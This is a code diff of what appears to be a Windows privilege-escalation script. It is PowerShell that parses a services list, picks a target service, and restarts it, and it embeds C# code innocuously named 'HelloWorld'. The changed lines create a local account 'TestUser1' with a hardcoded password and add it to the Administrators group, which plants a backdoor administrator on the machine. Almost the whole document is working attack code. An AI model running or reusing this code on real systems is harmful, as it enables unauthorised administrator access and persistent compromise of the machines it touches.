@@ -1,4 +1,4 @@
- $f=(Get-Content $env:AppData\services.txt)
+$f=(Get-Content $env:AppData\services.txt)
 $targets = @()
 (($f -match '^  (Name|PathName)') -replace '  Name',"`nName" -replace "  PathName","PathName") -join "," | % {
     if($_ -notmatch '^ '){
@@ -23,18 +23,25 @@ namespace HelloWorld
             bool userExists = false;
             foreach (DirectoryEntry each in entries)
             {
-                userExists = each.Name.Equals("NewUser",StringComparison.CurrentCultureIgnoreCase);
+                userExists = each.Name.Equals("TestUser1",StringComparison.CurrentCultureIgnoreCase);
                 if (userExists)
                     break;
             }
 
             if (false == userExists)
             {
-                DirectoryEntry obUser = entries.Add("NewUser", "User");
-                obUser.Properties["FullName"].Add("Local user");
-                obUser.Invoke("SetPassword", "abcdefg12345@");
-                obUser.Invoke("Put", new object[] {"UserFlags", 0x10000});
-                obUser.CommitChanges();
+                
+                DirectoryEntry AD = new DirectoryEntry("WinNT://" +
+                Environment.MachineName + ",computer");
+                DirectoryEntry NewUser = AD.Children.Add("TestUser1", "user");
+                NewUser.Invoke("SetPassword", new object[] {"#12345Abc"});
+                NewUser.Invoke("Put", new object[] {"Description", "Test User from .NET"});
+                NewUser.CommitChanges();
+                DirectoryEntry grp;
+
+                grp = AD.Children.Find("Administrators", "group");
+                if (grp != null) {grp.Invoke("Add", new object[] {NewUser.Path.ToString()});}
+                Console.WriteLine("Account Created Successfully");
             }
 		}
 	}
@@ -46,6 +53,3 @@ namespace HelloWorld
     Stop-Service "$targets[0].Name" -ErrorAction SilentlyContinue
     Start-Service "$targets[0].Name" -ErrorAction SilentlyContinue
 }
-
- 
- 
